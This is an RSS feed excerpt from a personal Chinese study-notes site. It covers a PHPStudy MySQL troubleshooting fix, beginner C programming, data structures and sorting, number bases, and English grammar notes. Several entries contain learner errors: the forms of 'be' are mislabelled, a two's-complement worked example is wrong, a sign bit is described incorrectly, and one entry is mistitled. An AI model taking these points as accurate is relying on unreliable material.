net stop mysqlsc delete mysql 提示[SC] DeleteService 成功后，重新打开 PHPStudy，会发现 MySQL 可以正常启动了。
错误二 提示错误信息：
1045 access denied for user &amp;#39;root&amp;#39;@&amp;#39;localhost&amp;#39; using password yes 5.7.26 解决方案   停用 MySQL 服务 没启动的可以省略
net stop mysql   找到 MySQL 安装路径下的 my.ini
  打开 my.ini 找到 [mysqld] 然后在下面加上 skip_grant_tables，表示启动 MySQL 服务的时候跳过权限表认证
  启动数据库修改密码
  刷新权限 flush privileges</description>
    </item>
    
    <item>
      <title>C 三目运算符</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E8%BF%90%E7%AE%97%E7%AC%A6/%E4%B8%89%E7%9B%AE%E8%BF%90%E7%AE%97%E7%AC%A6/</link>
      <pubDate>Tue, 19 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E8%BF%90%E7%AE%97%E7%AC%A6/%E4%B8%89%E7%9B%AE%E8%BF%90%E7%AE%97%E7%AC%A6/</guid>
      <description>三目运算符 a ? b : c 相当于 if 语句
if (a);  b; else  c; return 0; </description>
    </item>
    
    <item>
      <title>C 逗号表达式</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E8%BF%90%E7%AE%97%E7%AC%A6/%E9%80%97%E5%8F%B7%E8%A1%A8%E8%BE%BE%E5%BC%8F/</link>
      <pubDate>Tue, 19 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E8%BF%90%E7%AE%97%E7%AC%A6/%E9%80%97%E5%8F%B7%E8%A1%A8%E8%BE%BE%E5%BC%8F/</guid>
      <description>逗号表达式 (a,b,c,d) 从左向右执行，表达式最终的值是 d 的值。
#include &amp;lt;iostream&amp;gt;#include &amp;lt;malloc.h&amp;gt; int main() {  int i;  int c = 2;  i = (c++, ++c, c + 2, c - 3);  // 执行了 c++ 与 ++c 后，c 变为了 4，然后执行 c + 2，  // 但此时并没有将 c + 2 的结果赋给 c，因此此时的 c 依旧为 4，  // 再 c - 3，则 i = 1.  printf(&amp;#34;%d&amp;#34;, i);  // return 1  return 0; } </description>
    </item>
    
    <item>
      <title>C 反转</title>
      <link>https://note.yxzi.xyz/note/technology/datastructure/algorithm/%E9%93%BE%E8%A1%A8/%E5%8F%8D%E8%BD%AC%E9%93%BE%E8%A1%A8/</link>
      <pubDate>Mon, 18 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/datastructure/algorithm/%E9%93%BE%E8%A1%A8/%E5%8F%8D%E8%BD%AC%E9%93%BE%E8%A1%A8/</guid>
      <description>反转链表 // * pHead 头指针 struct ListNode* ReverseList(struct ListNode* pHead ) { 	// pHead 头结点 	// 当为空、或者 只有一个元素时直接退出  if(pHead == NULL)  return NULL;  if(pHead-&amp;gt;next == NULL)  return pHead;   //至少两个元素时  //定义两个空指针  struct ListNode *p = NULL;  struct ListNode *temp = NULL;  // p ：首结点，断开头结点指向空  p = pHead-&amp;gt;next;  pHead-&amp;gt;next = NULL;  // 首结点的下一个结点不为空  while(p-&amp;gt;next != NULL)  {  // 记录首结点的下一个结点  temp = p-&amp;gt;next;   // 头删  p-&amp;gt;next = pHead;   // 将首结点设置为头结点  pHead = p;   // 将当前节点的下一个结点  p = temp;  } 	//退出时 p 是最后一个结点 也是最终目标链表头结点   //p 指向头结点  p-&amp;gt;next = pHead; 	//p设置为头结点  pHead = p;  //返回 pHead  return pHead; } </description>
    </item>
    
    <item>
      <title>C 链表</title>
      <link>https://note.yxzi.xyz/note/technology/datastructure/algorithm/%E9%93%BE%E8%A1%A8/%E9%93%BE%E8%A1%A8/</link>
      <pubDate>Mon, 18 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/datastructure/algorithm/%E9%93%BE%E8%A1%A8/%E9%93%BE%E8%A1%A8/</guid>
      <description>链表 链表主要是便于管理长度或数量不确定的数据，相对于数组，链表处理这种数据时比较节省内存。
链表靠节点的指针域中存放的指针地址来寻找下一个元素。
确定一个链表，只需要知道头指针即可。
优点 存取数据效率高。
不需要一个太大的内存。
缺点 查找某个位置的元素时，效率很低。
结点 链表由一个个的结点组成，每个节点左侧是数据域，右侧是指针域，数据域用来存放当前节点的有效数据，指针域用来存放下一个节点的指针地址。
链表中一个个的元素，被称之为结点，每个结点都有数据域和指针域。
首结点 链表中存放第一个有效数据的节点。
尾结点 链表中存放最后一个有效数据的节点，尾节点的指针域为 Null。
头结点 头结点的数据类型和首节点的类型一模一样。
头结点是首节点前面的那个节点。
头结点的数据域通常不存放任何有效数据，但头结点的指针域存放的是首节点的地址。
设置头结点的目的是为了方便对链表的操作。
任何一个链表都有一个头结点
空链表，指的是头结点的指针域为 Null 的链表，非空链表，指的是头结点的指针域有指向的链表。
头指针 它不是链表的节点，只是一个指针变量，用于存放头结点的指针地址。
链表实例 # include &amp;lt;stdio.h&amp;gt; # include &amp;lt;malloc.h&amp;gt; # include &amp;lt;stdlib.h&amp;gt;  // 定义一个链表 struct Node {  // 定义链表中节点的数据域  int data;  // 定义链表中节点的指针域。  // 指针域是一个 struct Node *类型的 pNext，其中 pNext 中存放的是 struct Node 变量的地址  struct Node * pNext; };  struct Node * CreateList(void); void TraverseList(struct Node *);  int main(void) {  // 定义头指针 pHead，用来存放链表的头结点的地址，  // 也就是我们可以通过 pHead 中存放中的地址，找到链表的头结点.</description>
    </item>
    
    <item>
      <title>数据结构</title>
      <link>https://note.yxzi.xyz/note/technology/datastructure/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</link>
      <pubDate>Mon, 18 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/datastructure/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</guid>
      <description>数据结构 数据结构是指计算机存储和组织数据的一种的结构。
将现实中大量而复杂的问题以特定的数据类型和特定的存储结构存储到内存中，以此来实现某个功能（删除、查找、排序）而执行相应的操作，这个相应的操作也叫算法。
数据结构定义数据将以什么样的形式存储到内存中，而算法定义的是我们如何对内存中的数据结构进行操作。
程序 = 数据的存储（数据结构） + 数据的操作（算法） + 可以被程序执行的语言（变成语言）</description>
    </item>
    
    <item>
      <title>算法</title>
      <link>https://note.yxzi.xyz/note/technology/datastructure/algorithm/%E7%AE%97%E6%B3%95/</link>
      <pubDate>Mon, 18 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/datastructure/algorithm/%E7%AE%97%E6%B3%95/</guid>
      <description>算法 算法是为了解决一个问题而设计的一种操作。
算法目的就是为了解决问题，它是一系列解题步骤，一个计算过程。因此，我们描述算法，通常可以使用伪代码。
定义 通俗定义 解题的方法和步骤。
狭义定义 对存储数据的操作。
对不同的数据结构，要完成某一个功能所执行的操作是不一样的。
比如，输出数组所有的元素和输出链表中所有的元素的操作是不一样的。这说明，算法是依附于数据结构，不同的数据结构，所执行的算法是不一样的。
广义定义 广义的算法也叫泛型。无论数据是如何存储的，对该数据的操作都是一样的。
我们至少可以通过两种结构来存储数据：
 数组 链表  衡量算法的标准 时间复杂度 程序执行的大概次数，而非执行时间。
为什么不是执行呢？
 这是因为在不同的机器上，同一个程序的执行时间是不同的（机器的性能不一样）。  空间复杂度 算法的执行过程中，大概所占用的最大内存。
可读性 算法是否容易让人理解。
健壮性 一个算法对不合理数据输入的反应能力和处理能力，也称为算法容错性。</description>
    </item>
    
    <item>
      <title>补码</title>
      <link>https://note.yxzi.xyz/note/technology/computer/%E8%A1%A5%E7%A0%81/</link>
      <pubDate>Mon, 18 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/computer/%E8%A1%A5%E7%A0%81/</guid>
      <description>补码 在计算机中，数值一律用补码来表示和存储。
补码是现代计算机使用的编码格式，同时解决了原码和反码的瑕疵。
已知十进制求二进制的补码 求正整数的二进制补码 除 2 取余，直至商为 0，余数倒序即可
求负整数的二进制补码 先求与该负数的相反数的二进制数，然后将所有位取反，末尾位加 1，不够位数，左侧补 1。
（-3）—&amp;gt; 011 —&amp;gt; 100 —&amp;gt; 101 — 11111111,11111111,11111111,11111101 — &amp;gt; FFFFFFFD
求零的二进制补码 全是 0。
已知二进制补码求十进制 如果二进制补码首位是 0，则表示这个数是正整数。
直接转十进制即可。
如果二进制补码首位是 1，则表示这个数是负整数。
将所有位取反，末位加 1，所得数字就是该负数的绝对值加 1。
1001010 —&amp;gt; 0110101 —&amp;gt; 0110110 —&amp;gt; 57 —&amp;gt; -54
如果二进制补码全是零，则表示这个数字是 0。
原码 原码不能直接参加运算
首位是 0 表示这个数是正整数，首位是 1 表示这个数是负整数，
其余二进制位是该数字的绝对值的二进制位。
（+35）00100011，就是 35 的二进制，不足位补零，0 表示负；
（-35）10100011，最高位放符号位，1 表示负。
反码 在计算机中不常用。
（+35）—&amp;gt; 00100011，和原码补码都相同
（-35）—&amp;gt; 11011100，+ 35 的原码全部取反即可求出 -35 的反码。或者 35 的补码最低位减去 1 获得。</description>
    </item>
    
    <item>
      <title>C 枚举</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%9E%9A%E4%B8%BE/</link>
      <pubDate>Sun, 17 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%9E%9A%E4%B8%BE/</guid>
      <description>枚举 将一个事物所有可能的取值给一一列举出来。
优点 使代码更加安全。
使代码更加直观。
缺点 书写麻烦。
# include &amp;lt;stdio.h&amp;gt; # include &amp;lt;malloc.h&amp;gt; // 定义一个数据类型，并没有定义变量，该数据类型的名字为 enum WeekDay enum WeekDay{  // 每一个元素，实际上都是数字，并且第一个元素默认是从 0 开始的，  // 当然，也可以指定首个元素是多少：MonDay = 1;那么此时的 Monday 就是 1，不再是 0 了  // 那么第二个元素就是 2，不再是 1 了，  // 这样写的好处是，WeekDay 的取值只能是下面的这些枚举常量，也就是将 WeekDay 的取值范围给限制了。  // 这样会让代码更加安全，也更加直观。  MonDay, TuesDay,WednesDay,ThursDay,FriDay,SaturDay,SunDay };  int main(void) {  // 因为一个周实际上只能有 7 天，因此这个 int week 只能取1 - 7，且不能是负数或则大于7 的数  // 但默认情况下，int week 的取值大概率会超出这个范围，但我们又不能强制要求 int 的 week 的取值范围是多少  // 所以，我们就需要用到枚举  int week;  // 虽然 WednesDay = 2，但是不能写成：  // enum WeekDay newWeek = 2;  // newWeek 的值只能是枚举常量  enum WeekDay newWeek = WednesDay;  // 实际上返回的是 2  printf(&amp;#34;%d&amp;#34;,newWeek); } </description>
    </item>
    
    <item>
      <title>English before</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/before/</link>
      <pubDate>Sun, 17 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/before/</guid>
      <description>before 表示在某个时间点以前 before + 表示几点钟的数词  I get up before 7:00 every day.  before + 表示具体的时间或具体时间点的词  We must finish our lessons before this year.  before + 表示几岁的词  Rainy will marry a good man before 40 years old.  before + 表示年份的词  We sill be very rich before 2030.  before 后面不能加一段时间：before three days。
如果要表示”三天之前“，可以用 ago 这个副词：three days ago。
表示位置 before + 地点/场所/人 这种情况表示在某个地点或某个人的前面。
 He boasts before Rainy.</description>
    </item>
    
    <item>
      <title>English behind</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/behind/</link>
      <pubDate>Sun, 17 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/behind/</guid>
      <description>behind 表示时间 behind + 时间点 这种情况表示晚于某个时间点。
 your idea is behind the times.  表示位置 behind + 地点 这种情况表示在某个地方都后面或在某个人的后面。
 The cat is behind the door. The tree behind my house is very big.  表示力量、能力 behind + 表示能力的词 这种情况表示能力落后/不如或低于某人。
 I am far behind you in English.  </description>
    </item>
    
    <item>
      <title>English below</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/below/</link>
      <pubDate>Sun, 17 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/below/</guid>
      <description>below 表示位置 below + 表示地点的词语 这种情况表示在某个地点的下面。
 Your cellphone is below the wall.  表示数量、年龄、价值 below + 表示数量、程度、价值、年龄、温度的词语 这种情况表示低于某个临界点或在某个临界点等。
 She is below 20 years old. It is below 20 ℃. The people below 18 years old cant attend my course.  </description>
    </item>
    
    <item>
      <title>English beside</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/beside/</link>
      <pubDate>Sun, 17 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/beside/</guid>
      <description>beside 表示位置 beside + 表示地点的名词 表示在这个某个地点的旁边或者附近。
  The room beside the bathroom is mine.
  She is beside the bathroom.
  My student drink tea beside the sea every afternoon.
  表示对比 beside + 名词或代词 表示与某人相比。
 Beside his, my trouble is nothing.  表示无关  That is beside the question.  </description>
    </item>
    
    <item>
      <title>English between</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/between/</link>
      <pubDate>Sun, 17 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/between/</guid>
      <description>between 表示时间、位置、数量  在&amp;hellip;之间。  between + 两个事物/两个人 表示在两者之间。
注意，Among 才是表示三者以上，包括三者。
 He does busines between America and China. They don&amp;rsquo;t know the secret between you and me.  between + 两个时间点 表示在两个时间点之内的这段时间。
 We have a class between 20:00 and 22:00. I will rich between 30 and 50 years old.  表示关系、比较、分配  在&amp;hellip;之间。  between + 名词 这种情况，一般作后置定语，表示两者之间的关系/比较两者等。
 What is the difference between American English an British English.</description>
    </item>
    
    <item>
      <title>二分查找</title>
      <link>https://note.yxzi.xyz/note/technology/datastructure/algorithm/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/</link>
      <pubDate>Sun, 17 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/datastructure/algorithm/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/</guid>
      <description>二分查找 #include &amp;lt;stdio.h&amp;gt;void main(){ 	int arr[] ={1,3,7,10,12,14,17,20,21,23}; 	int num = 50; 	int left = 0, right = 10; 	int flag = 0; 	while(left &amp;lt; right){ 	int middle = (left + right)/2; 	if(arr[middle] &amp;gt; num){ 	right = middle; 	} 	if(arr[middle] &amp;lt; num){ 	left = middle +1; 	} 	if(arr[middle] == num){ 	printf(&amp;#34;%d&amp;#34;,middle); 	flag = 1; 	break; 	} 	} 	if(flag == 0 ){ 	printf(&amp;#34;not found\n&amp;#34;); 	} } </description>
    </item>
    
    <item>
      <title>冒泡排序</title>
      <link>https://note.yxzi.xyz/note/technology/datastructure/algorithm/sort/%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F/</link>
      <pubDate>Sun, 17 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/datastructure/algorithm/sort/%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F/</guid>
      <description>冒泡排序 流程   比较相邻的两个元素，升序则交换两个数的位置，降序则位置不变。
  对每一对相邻元素作同样的操作，从开始第一对到结尾的最后一对。直到产生一个最大或者最小的数（这取决于你是升序还是降序）。升序是产生最大的数，降序是产生最小的数。
  重新开始下一轮遍历，但无需遍历上轮遍历时所产生的最大数。
  实现升序 # include &amp;lt;stdio.h&amp;gt;  // *arr 数组 // len 数组长度 void BubbleSort(int * arr, int len){   // 整体比较轮数  int i;   // 元素与元素的比较次数  int j;   // 媒介变量，用于交换两个元素的位置  int t;   // 整体比较轮数  // 需要b len-1 轮，每轮整体比较都需要进行元素与元素的比较。  for (i = 0; i &amp;lt; len-1;i ++){   // 元素与元素的比较次数  // 每进行一轮比较，都会在数组末尾产生一个最大元素。  // 下次比较时，这个最大元素将不再参与和其他元素的比较，因此，元素与元素的比较次数为 j &amp;lt; len - 1 - i。  for(j = 0;j &amp;lt; len - 1- i;j++){   // 元素与元素的比较 	// 从第一个元素 a[j] 与第二个元素 a[j+1] 开始依次比较。  if (arr[j] &amp;gt; arr[j+1]){   // 交换两个元素的位置。  t = arr[j];  arr[j] = arr[j+1];  arr[j + 1] = t;  }  }  } }  int main(void) {  int arr[] = {10,2,8,-8,11,0};  BubbleSort(arr,6);  for(int i = 0; i &amp;lt; 6;i++){  printf(&amp;#34;%d &amp;#34;,arr[i]);  }  printf(&amp;#34;\n&amp;#34;); </description>
    </item>
    
    <item>
      <title>冒泡排序</title>
      <link>https://note.yxzi.xyz/note/technology/datastructure/algorithm/sort/%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F/</link>
      <pubDate>Sun, 17 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/datastructure/algorithm/sort/%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F/</guid>
      <description>选择排序 流程  在未排序的元素中找到最小（或最大）元素，将其存放到该数组的起始位置， 跳过已排序数，从剩余未排序的元素中继续寻找最小（或最大）元素，放到已排序数组的末尾。 以此类推，直到所有元素均排序完毕。  实现升序 #include &amp;lt;stdio.h&amp;gt; void SelectionSort(int *arr,int len) {   // 已排序元素的末尾位置  int i;   // 未排序元素的起始位置  int j;   int k;   // 媒介变量，用于交换两个元素的位置  int t;   // 整体比较轮数  // 需要比较 len 轮  for(i = 0; i &amp;lt; len; i++)  {   // 跳过已排序的数  int k = i;   // 忽略已排序的数，直接从未排序的数开始比较，找出未排序数中的最小数  for(j = i; j &amp;lt; len; j++)  {  printf(&amp;#34;%d\n&amp;#34;,i);  if(arr[j] &amp;lt; arr[k])  {  // 将一对数中较小的数的索引赋给 k  k = j;  }  }   // 将最小的那个数移到数组最前面  t = arr[k];  arr[k] = arr[i];  arr[i] = t;  } }  int main() {  int arr[] = {5,7,1,3,8,12,2,9};  SelectionSort(arr,8);  for(int j = 0; j &amp;lt; 8; j++)  {  printf(&amp;#34;%d &amp;#34;,arr[j]);  } } </description>
    </item>
    
    <item>
      <title>进制</title>
      <link>https://note.yxzi.xyz/note/technology/computer/%E8%BF%9B%E5%88%B6/%E8%BF%9B%E5%88%B6/</link>
      <pubDate>Sun, 17 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/computer/%E8%BF%9B%E5%88%B6/%E8%BF%9B%E5%88%B6/</guid>
      <description>进制 进制也是进位计数制，是人为定义的带进位的计数方法。
十进制是逢十进一，十六进制是逢十六进一，二进制就是逢二进一，以此类推，N 进制就是逢 N 进位。
用不同的进制表示同一个数，虽然使用的进制不一样，但内部依旧表示的同一个数，只是外部所表现形式不一样而已。
进制的表示  B 表示二进制 O 表示八进制 D 表示十进制 H 表示十六进制  二进制的规律  1 = 1 10 = 21 100 = 22 1000 = 23 10000 = 24  </description>
    </item>
    
    <item>
      <title>进制转换</title>
      <link>https://note.yxzi.xyz/note/technology/computer/%E8%BF%9B%E5%88%B6/%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2/</link>
      <pubDate>Sun, 17 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/computer/%E8%BF%9B%E5%88%B6/%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2/</guid>
      <description>进制转换 二进制与八进制的转换 二进制转八进制 从右向左，三位一段，分别转换，不够三位补零。
0101110 —&amp;gt; 000, 101, 110，三位一段。
（000 = 0）（101 = 5）（110 = 6），则最后得到八进制数56。
八进制转二进制 将每一个八进制位转换为 3 个二进制位。
27 —&amp;gt; （010）（111），最后得到二进制数10111。
二进制与十六进制的转换 二进制转十六进制 从右向左，四位一段，分别转换，不够四位补零。
因为一个十六进制位有 16 种状态，所以需要 4 个二进制位的排列组合来表示，即每个 16 进制位，都需要用 4 个二进制位来表示，所以，我们可以将一串二进制位划分为好几段，四位为一段，不够四位的在前方补零，最后再一段一段的进行转换。
0101110 —&amp;gt; 0010, 1110，四位一段。
（0010 = 2）（1110 = 14 = E），则最后得到十六进制数2E
十六进制转二进制 将每一个十六进制位转换为 4 个二进制位。
2E —&amp;gt; （0010）（1110），一段四位则最后得到二进制数101110
十进制转 N 进制 **除 N 取余，直至商 0 ，余数倒序。**十六进制需要将余数转换
十进制转二进制 除以二取余，并将余数倒过来，即可得出结果。
比如 185：
 18 / 2 = 92， 余 1</description>
    </item>
    
    <item>
      <title>C 结构体</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E7%BB%93%E6%9E%84%E4%BD%93/%E7%BB%93%E6%9E%84%E4%BD%93/</link>
      <pubDate>Fri, 15 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E7%BB%93%E6%9E%84%E4%BD%93/%E7%BB%93%E6%9E%84%E4%BD%93/</guid>
      <description>结构体 将一些基本类型数据组合在一起，形成一个新的复合数据类型，这个复合数据类型，就是结构体。
为什么需要结构体 为了表示一些复杂的事物，而普通的基本类型无法满足我们的实际需求
结构体的定义 结构体有三种定义方式，但最常用的定义方式是第一种，第二种和第三种都不常用，相较于第一种定义方式，第一种和第二种方式也不是特别好。
需要注意的是，结构体最后的分号不能省去。
#include &amp;lt;iostream&amp;gt;#include &amp;lt;malloc.h&amp;gt;// 第一种定义结构体的方式 // 只定义变量类型， 但不定义变量名， // 变量名由我们使用这个变量类型的时候定义。 struct Student{  int age;  float score;  char sex; }; // 第二种定义结构体的方式 // 定义的同时，也将变量名（Sts）定义了（变量名写死了）。 struct Students{  int age;  float score;  char sex; } Sts; // 第三种定义结构体的方式 // 没有定义变量类型，只定义了变量名。 struct{  int age;  float score;  char sex; }St;  int main(void) { } </description>
    </item>
    
    <item>
      <title>C 结构体的使用</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E7%BB%93%E6%9E%84%E4%BD%93/%E7%BB%93%E6%9E%84%E4%BD%93%E7%9A%84%E4%BD%BF%E7%94%A8/</link>
      <pubDate>Fri, 15 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E7%BB%93%E6%9E%84%E4%BD%93/%E7%BB%93%E6%9E%84%E4%BD%93%E7%9A%84%E4%BD%BF%E7%94%A8/</guid>
      <description>结构体的使用 初始化和赋值   初始化一个结构体的时候，可以同时进行赋值。
  先初始化一个结构体，后续再一个变量一个变量的进行赋值。
  #include &amp;lt;iostream&amp;gt;#include &amp;lt;malloc.h&amp;gt; struct Student{  int age;  float score;  char sex; };  int main(void) {  // 初始化结构体，同时进行赋值  struct Student Rainy = {18,98.3,&amp;#39;N&amp;#39;};  // 初始化结构体，后续再一个变量一个变量的进行赋值  struct Student Rainys;  Rainys.age = 21;  Rainys.score = 95.6;  Rainys.sex = &amp;#39;V&amp;#39;;  printf(&amp;#34;%d %f %c\n&amp;#34;,Rainy.age,Rainy.score,Rainy.sex);  printf(&amp;#34;%d %f %c&amp;#34;,Rainys.age,Rainys.score,Rainys.sex);  } 访问结构体中的变量  通过结构体变量名.成员变量名的方式去访问结构体中的变量 通过指针变量名-&amp;gt;成员变量名 = (*指针变量名).</description>
    </item>
    
    <item>
      <title>English at</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/at/</link>
      <pubDate>Fri, 15 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/at/</guid>
      <description>at 表示地点 at + 小地方 at + 小地方容易和 in + 小地方混淆，前者表示在某个地方的范围或附近，而后者表示在某个地方的内部或里面。
 They met me at the station. They are at the balcony. My mother planted some flowers at the balcony.  需要注意的是 at 不能加大地方。
表示时间 在&amp;hellip;时刻 at 都是加一个基数词，表示在几点钟。
 I got up at six this morning. I get up at six every morning.  表示状态或从事与  they are at meeting.  表示速度/价格  I bought it at a low price.</description>
    </item>
    
    <item>
      <title>English 实义动词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%8A%A8%E8%AF%8D/%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/%E5%AE%9E%E4%B9%89%E5%8A%A8%E8%AF%8D/</link>
      <pubDate>Fri, 15 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%8A%A8%E8%AF%8D/%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/%E5%AE%9E%E4%B9%89%E5%8A%A8%E8%AF%8D/</guid>
      <description>实义动词 表示有实际意义的动词，除了系动词、助动词、情态动词，剩下的就是实义动词。
任何一个实义动词都有五种形式（原型、过去式、过去分词、现在分词、第三人称单数格式）。
虽然一个实义动词有五种格式，但是这五种格式都是同一个意思，比如 work、worked、works，都是工作的意思。
为什么一个单词会有五种不同的形式？这是因为英语有时态的变化，即不同的时态，使用不同的形式。
一般来说，过去式、过去分词、现在分词和第三人称单数格式都是通过原型变化而成的。在单词的原型后面增加字母组合，这叫词尾变化。
不及物动词 可以独立完成的动词叫做不及物动词，动词后面不需要物，也不能有物，因为不加物的情况下，这个句子的意思已经完整了
因为，一个单词有不同的意思，因此，一个单词也有可能又是及物动词，又是不及物动词。
 Rainy sleeping. I work.  单及物动词 只有一个动作承受者，单及物动词后面只能跟着一个物。
 Rainy like you. Rainy buy water.  双及物动词  有两个动作承受者，即动词后有两个“物”，一个“动物”，一个“物体”。 Rainy teaches you English。 一般句型为：主语 + 双及物动词 + 间接宾语 + 直接宾语。  复杂及物动词  只有一个动作承受者，动词后面要有一个“物”，这个物后面还要有一个对这个“物”的补充说明 Rainy consider you smart。 一般句型为：主语 + 复杂及物动词 + 宾语 + 宾补。  复合动词 由动词和另一个单词或几个单词所构成的词组。
动词短语虽然由几个词构成，但实际上它只表示一个动作。
 Look after Look forward to Look at Git up  </description>
    </item>
    
    <item>
      <title>English 非实义动词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%8A%A8%E8%AF%8D/%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/%E9%9D%9E%E5%AE%9E%E4%B9%89%E5%8A%A8%E8%AF%8D/</link>
      <pubDate>Fri, 15 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%8A%A8%E8%AF%8D/%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/%E9%9D%9E%E5%AE%9E%E4%B9%89%E5%8A%A8%E8%AF%8D/</guid>
      <description>非实义动词 助动词 它没有意思的，且不能单独使用，只能用于协助系动词或实义动词构成复合谓语。
注意不要将助动词与它本身的实义弄混淆。
比如 Might eat，助动词 might，协助谓语动词 eat 表示可能吃，但 might 也可以表示力量，注意别将助动词与其本身的实义弄混淆。
助动词有：be、do、have、will、would、shall、should.
 Do you love me. I do not love you. I did not love you. She does not love you.  情态动词 它是语气助动词，情态动词本身有意义，但是意义不完整。比如can、should、need、have、dare、had better.
情态动词后面必须跟一个动词原型，才能构成一个复合谓语使用。
情态动词一般不能跟助动词连用。
 I must earn money every day. I should help you. You must be hungry. I can speak English. I have to do.  系动词 不单是动作，将动词之后的信息赋给在动词之前信息。也叫连系动词，即连系表语的词。
系动词不能单独使用，必须跟表语一起用。
系动词大部分都是 be 动词，它有八种形式：
 be（原型） is（第一人称单数） am（第三人称单数） are（You 和复数） was（单数的过去式） were（复数的过去式） being（过去分词） been（现在分词）  be 动词都是是的意思，但有有些时候并不用在一句话中被翻译出来。</description>
    </item>
    
    <item>
      <title>English about</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/about/</link>
      <pubDate>Thu, 14 Apr 2022 00:00:00 +0000</pubDate>
      
